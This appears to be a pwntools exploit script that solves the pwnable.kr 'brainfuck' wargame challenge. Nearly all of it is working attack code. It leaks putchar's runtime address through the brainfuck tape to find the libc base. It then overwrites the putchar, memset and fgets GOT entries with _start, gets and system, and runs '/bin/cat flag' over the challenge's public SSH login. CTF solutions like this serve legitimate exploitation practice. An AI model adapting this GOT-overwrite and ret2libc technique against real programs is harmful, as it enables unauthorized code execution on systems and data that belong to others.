#!/bin/python3
from pwn import * 
import sys 
import os

from pwnlib.tubes.ssh import ssh_process

def getbyte(src,dest):
        if src > dest: 
            return b"<" * abs(dest - src)
        else : 
            return b">" * abs(src - dest)

context.log_level = "error"

elf  = ELF('./brainfuck') 
libc = ELF('./libc-2.23.so')

elf_tape    = elf.symbols["tape"]
elf_putchar = elf.got["putchar"]
elf_start   = elf.symbols["_start"]
elf_fgets   = elf.got["fgets"]
elf_memset  = elf.got["memset"]

payload  = getbyte(elf_tape,elf_putchar) + b"." + b".>" * 4 + b"<" * 4
payload += b",>" * 4 + b"<" * 4
payload += getbyte(elf_putchar,elf_memset) + b",>" * 4 + b"<" * 4 
payload += getbyte(elf_memset,elf_fgets)   + b",>" * 4 + b"<" * 4
payload += b"." 

s = ssh(user="brainfuck",host="pwnable.kr",port=2222,password="guest")
p = s.process(["nc","0","10017"])
#p = s.remote("0",10017)

if not isinstance(p,ssh_process) : 
    exit(1)

p.recvuntil(b"]\n")

p.sendline(payload)
p.recv(1)

runtime_putchar = int(p.recv(4)[::-1].hex(), 16)
runtime_base   = runtime_putchar - libc.symbols["putchar"]
runtime_gets   = runtime_base + libc.symbols["gets"] 
runtime_system = runtime_base + libc.symbols["system"] 

p.send(p32(elf_start))
p.send(p32(runtime_gets))
p.send(p32(runtime_system))
p.sendline(b"/bin/cat flag\x00")

p.recvlines(2)
print(p.recvuntil(b"\n").decode(),end="")

